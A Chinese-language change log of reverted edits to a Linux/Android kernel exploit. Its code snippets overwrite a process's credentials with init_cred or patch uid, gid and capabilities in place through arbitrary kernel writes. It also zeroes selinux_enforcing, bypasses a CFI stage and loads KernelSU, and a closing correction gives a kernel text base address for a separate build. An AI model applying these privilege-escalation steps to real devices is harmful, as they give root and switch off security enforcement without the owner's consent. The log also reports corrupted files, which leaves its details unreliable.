# fops.c 修改记录（已回退，仅供参考）

## 修改 1: direct_cred_replace() 步骤 3-4 → in-place cred patch

原始代码（替换 cred 指针 + selinux_zero）：
```c
/* 步骤 3: 写 init_cred → task->real_cred 和 task->cred */
uintptr_t init_cred = text_addr(INIT_CRED);
uintptr_t real_cred_slot = (uintptr_t)task + TASK_REAL_CRED_OFF;
direct_trigger_write64("install_real_cred", real_cred_slot, init_cred, 1, &write_idx);

/* 步骤 4: 写 init_cred → task->cred + followup selinux_enforcing=0 */
uintptr_t selinux_addr = text_addr(SELINUX_ENFORCING);
direct_trigger_write64_followup("install_cred_then_selinux_zero", cred_slot, init_cred, 1, selinux_addr, &write_idx);
```

替换为（就地 patch uid/gid/caps）：
```c
/* 步骤 3: 读 task->cred 指针 */
uintptr_t cred_ptr_slot = (uintptr_t)task + TASK_CRED_OFF;
uint64_t cred_addr;
direct_read_shape0_exact64_once(cred_ptr_slot, &cred_addr, "cred_addr", ...);

/* 步骤 4: 10 次 pselect write 就地 patch */
// cred+8: uid+gid=0, cred+16: suid+sgid=0, ..., cred+40: securebits=0
// cred+48~80: cap_inheritable~cap_ambient=CAP_FULL
// cred+128 (security): 不动
// selinux_enforcing: 不动
```

## 修改 2: verify 步骤去掉 install_kernelsu_late_load

原始：fork 子进程验证 uid==0 后调用 install_kernelsu_late_load()
修改：只验证 uid==0，不调用 KernelSU（Enforcing 下 KSU 可能失败）

## 修改 3: PSELECT_ROUTE_NFDS 64→320

文件：src/common.h:133
```c
// 原始
#define PSELECT_ROUTE_NFDS 64
// 修改为
#define PSELECT_ROUTE_NFDS 320
```

## 修改 4: CFI attempts 24→1

文件：src/fops.c:5-6
```c
// 原始
#define PSELECT_CFI_ROUTE_ATTEMPTS 24
// 修改为
#define PSELECT_CFI_ROUTE_ATTEMPTS 1
```

## 修改 5: try_cfi_stage() 跳过 CFI 直接走 direct path

```c
// 原始：打开 ashmem，尝试 configfs write，失败 goto fail
// 修改：直接调用 direct_cred_patch_inplace()
int try_cfi_stage(void) {
  cfi_attempts++;
  cfi_last_step = 1;
  cfi_last_errno = 0;
  return direct_cred_patch_inplace();
}
```

## 状态：全部已 git checkout 回退

原因：
1. 源码版本不匹配（当前 git 没有 direct_cred_replace 等函数）
2. 新编译 SO 的 pselect write 持续超时
3. 修改过程中文件损坏

## 2026-07-23 correction

上面的 diff 只描述此前针对当前大 exploit 源码的失败尝试，仍然全部回退，不是本轮候选的来源。附件 `r.so/r2.so` 对应的是 direct Linuxoid 架构；本轮候选位于 `build-so/source/src/main.c` 的隔离副本，直接读 `task->real_cred`/`task->cred` 后 patch pointed cred 对象。另由 `r.so` 反汇编确认该 direct artifact 使用 `KIMAGE_TEXT_BASE=0xffffffc080000000`，不能沿用当前大 exploit target 的旧 base。
